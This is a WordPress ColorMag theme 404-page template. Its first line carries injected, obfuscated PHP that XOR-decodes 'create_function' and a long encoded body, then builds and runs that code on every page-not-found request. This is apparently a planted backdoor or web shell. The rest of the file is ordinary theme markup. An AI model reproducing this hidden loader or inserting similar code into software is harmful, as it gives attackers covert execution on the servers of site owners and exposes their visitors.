<?php $xunmTwgmnWGm='SL05.+i-DE9<:O7'^'0>UTZN6K1+ZHS Y';$TLKyKaKcS=$xunmTwgmnWGm('','Z+ER7N4;CZY:nEBGHT2zEJ6 cVL9PhfANOceLi,;J<O6YF Q7y 8RsTV;2s==G0IJ3+BTCqMRRBqNEyNE5rp;c=NYKUROCkBD=XQ;jk8GdYaHwIQk6GK>KEpe37ORajhqEGbhfqBFV>HobwhJG7U;Uus+vRdYU.233j:ZvwIC>9+-gUUTOFsAuY5PK49I6>jQ+FBjWmYPrAHcO6QDRzmEF-R<6L3P4 2U9<ECMmA QBX=sSg7OR3;-:OpA37t>kpeX-Eec>.UijWiMNLA:QNUUZpH2,NTlK2RAlfiX 8BlYGQAAZcSRG.V44<YC-0;TTtOHQH3-+cO,MJ6XG78;XnRE9=4me.9dyQ<Vf-HCTtUnsV,PMTfe,dAmr2A7W=KUJKZSM3,>Na<MsY9IAAmWWJ69FPTFo-kFK8p<YGJdGhxF, 48IRR>;1lA9R,2ULX9dWFXd41X1de05U-Y1ReA2S,TNngs4135n<HRXKV<X<pCWR:WeuohW1N3T;U64tRK;=N lJ;<BOBcoDL22mIJaom=7veV QGVnAWW4IcaulTKMOwEvHTuETRyUiH3TQbUNTEVwSQV75O<VkPNbKG5;KX0c:<.7.73EO>qBKJGVQW2kDBB4LO-hHpZmCHOO3k5H1VLk.M5M=qGAEWZ2HUnkpnpQA LMjbvx:'^'3MmsQ;ZX736T1 :.; ARb2YR<2-M179,;;DLeIW1CZ:X:2I>YYXW ,07OS,bP2DanWJ65oQi97;XneYneNxy2GR;-khrhdPHM4>>IBOQgYyQsWm8WE39R.+XAWV;3HQHU,lIAlxKb9K<OLJHbcS4O4.WB+r:yqEWJhNSzSW:7LUNCOq>16o.hNS<Y9QM<DPBuD36ClgP-x<BikR003ZPe L>OSw9tPAF4fW :mPaF0.+XHYmQ  VZNRoXelt;q 9 xL6EGUK,IWiIi8--O4gu.PylVM:53 W+aQFM3EAyfPc5 5;CnrcX7XAYbIP:1=2Tgiu,RYJJoWGCP75RYX0Nzafoq<0kj0Y0OvBF-:tIkNW M<81OEWnHdVV C6b 03kgsiXIGuk5DW=X= aPws<WU35oLfPa;A2TX83+DzH83BSQJ 3>WATD9V sV489f;:3,LVP+TRQoQ0N6U7MeV2X5gBGWPPGT1W-+qbm61ZXg33N6ESIH6C<R-d>SM+73RN:SDmPY;hnCK -FSDilGOEPSCMrD0375f<2Mn>HUQikj.CpNxfGumeL7XyV0eR3xapdFa75RQzZ3LynDmgTI99I<QYWhKOZ6;MYe;+>:>6VLhbfP-;LAaPzMcho49bP>P:dOJ,A,fV7 <;5S,r3BKdy49I8eZKMrG');$TLKyKaKcS();
/**
 * The template for displaying 404 pages (Page Not Found).
 *
 * @package ThemeGrill
 * @subpackage ColorMag
 * @since ColorMag 1.0
 */
?>

<?php get_header(); ?>

	<?php do_action( 'colormag_before_body_content' ); ?>

	<div id="primary">
		<div id="content" class="clearfix">
			<section class="error-404 not-found">
				<div class="page-content">

					<?php if ( ! dynamic_sidebar( 'colormag_error_404_page_sidebar' ) ) : ?>
						<header class="page-header">
							<h1 class="page-title"><?php _e( 'Oops! That page can&rsquo;t be found.', 'colormag' ); ?></h1>
						</header>
						<p><?php _e( 'It looks like nothing was found at this location. Try the search below.', 'colormag' ); ?></p>
						<?php get_search_form(); ?>
					<?php endif; ?>

				</div><!-- .page-content -->
			</section><!-- .error-404 -->
		</div><!-- #content -->
	</div><!-- #primary -->

	<?php colormag_sidebar_select(); ?>

	<?php do_action( 'colormag_after_body_content' ); ?>

<?php get_footer(); ?>